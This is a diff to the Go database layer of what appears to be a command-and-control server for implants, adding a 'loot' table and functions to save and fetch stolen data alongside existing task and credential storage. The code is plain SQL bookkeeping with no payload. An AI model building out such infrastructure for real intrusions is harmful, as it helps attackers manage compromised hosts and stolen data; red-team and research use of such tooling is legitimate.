@@ -82,6 +82,16 @@ func createTables() error {
 		FOREIGN KEY (implant_id) REFERENCES implants(id)
 	);
 
+	CREATE TABLE IF NOT EXISTS loot (
+		id TEXT PRIMARY KEY,
+		implant_id TEXT,
+		type TEXT,
+		name TEXT,
+		data BLOB,
+		created DATETIME,
+		FOREIGN KEY (implant_id) REFERENCES implants(id)
+	);
+
 	CREATE INDEX IF NOT EXISTS idx_tasks_implant ON tasks(implant_id);
 	CREATE INDEX IF NOT EXISTS idx_tasks_status ON tasks(status);
 	CREATE INDEX IF NOT EXISTS idx_creds_implant ON credentials(implant_id);
@@ -264,6 +274,37 @@ func SaveTaskResult(result *proto.TaskResult) error {
 	return err
 }
 
+func GetTask(taskID string) (*Task, error) {
+	dbLock.RLock()
+	defer dbLock.RUnlock()
+
+	var t Task
+	var created string
+	var completed sql.NullString
+	var data, output []byte
+	var errorStr sql.NullString
+
+	err := database.QueryRow(`
+		SELECT id, implant_id, type, args, data, status, output, error, created, completed
+		FROM tasks WHERE id = ?`, taskID).Scan(
+		&t.ID, &t.ImplantID, &t.Type, &t.Args, &data, &t.Status, &output, &errorStr, &created, &completed)
+	if err != nil {
+		return nil, err
+	}
+
+	t.Data = data
+	t.Output = output
+	if errorStr.Valid {
+		t.Error = errorStr.String
+	}
+	t.Created, _ = time.Parse(time.RFC3339, created)
+	if completed.Valid && completed.String != "" {
+		completedTime, _ := time.Parse(time.RFC3339, completed.String)
+		t.Completed = &completedTime
+	}
+	return &t, nil
+}
+
 func GetTasksForImplant(implantID string) ([]*Task, error) {
 	dbLock.RLock()
 	defer dbLock.RUnlock()
@@ -409,6 +450,60 @@ func GetAllCredentials() ([]*Credential, error) {
 		creds = append(creds, &c)
 	}
 	return creds, nil
+}
+
+func SaveLoot(l *Loot) error {
+	dbLock.Lock()
+	defer dbLock.Unlock()
+
+	if l.ID == "" {
+		l.ID = uuid.New().String()
+	}
+
+	created := l.Created.Format(time.RFC3339)
+	_, err := database.Exec(`
+		INSERT INTO loot (id, implant_id, type, name, data, created)
+		VALUES (?, ?, ?, ?, ?, ?)`,
+		l.ID, l.ImplantID, l.Type, l.Name, l.Data, created)
+	return err
+}
+
+func GetAllLoot() ([]*Loot, error) {
+	dbLock.RLock()
+	defer dbLock.RUnlock()
+
+	rows, err := database.Query(`SELECT id, implant_id, type, name, created FROM loot ORDER BY created DESC`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var loot []*Loot
+	for rows.Next() {
+		var l Loot
+		var created string
+		if err := rows.Scan(&l.ID, &l.ImplantID, &l.Type, &l.Name, &created); err != nil {
+			continue
+		}
+		l.Created, _ = time.Parse(time.RFC3339, created)
+		loot = append(loot, &l)
+	}
+	return loot, nil
+}
+
+func GetLoot(id string) (*Loot, error) {
+	dbLock.RLock()
+	defer dbLock.RUnlock()
+
+	var l Loot
+	var created string
+	err := database.QueryRow(`SELECT id, implant_id, type, name, data, created FROM loot WHERE id = ?`, id).Scan(
+		&l.ID, &l.ImplantID, &l.Type, &l.Name, &l.Data, &created)
+	if err != nil {
+		return nil, err
+	}
+	l.Created, _ = time.Parse(time.RFC3339, created)
+	return &l, nil
 }
 
 var (
